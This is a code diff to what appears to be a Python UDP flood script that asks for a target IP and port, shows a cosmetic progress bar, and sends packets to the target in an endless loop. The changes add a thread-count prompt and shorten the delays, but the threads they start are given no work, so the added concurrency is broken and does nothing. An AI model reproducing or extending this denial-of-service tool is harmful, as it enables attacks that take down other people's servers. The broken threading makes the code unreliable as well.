@@ -3,6 +3,7 @@ import os
 import time
 import socket
 import random
+import threading
 
 #Code Time
 from datetime import datetime
@@ -29,18 +30,29 @@ print('Telegram : @VSokha')
 print('')
 ip = input("IP Target : ")
 port = int(input("Port      : "))
+try:
+    threads = int(input("Threads   : "))
+except ValueError:
+    exit("Threads count is incorrect!")
+
 
 print("[                    ] 0% ")
-time.sleep(5)
+time.sleep(2)
 print("[=====               ] 25%")
-time.sleep(5)
+time.sleep(2)
 print("[==========          ] 50%")
-time.sleep(5)
+time.sleep(2)
 print("[===============     ] 75%")
-time.sleep(5)
+time.sleep(2)
 print("[====================] 100%")
 time.sleep(1)
 sent = 0
+
+
+for i in range(0, threads):
+    thr = threading.Thread()
+    thr.start()
+    print(str(i + 1) + " thread started!")
 
 while True:
      sock.sendto(bytes, (ip,port))
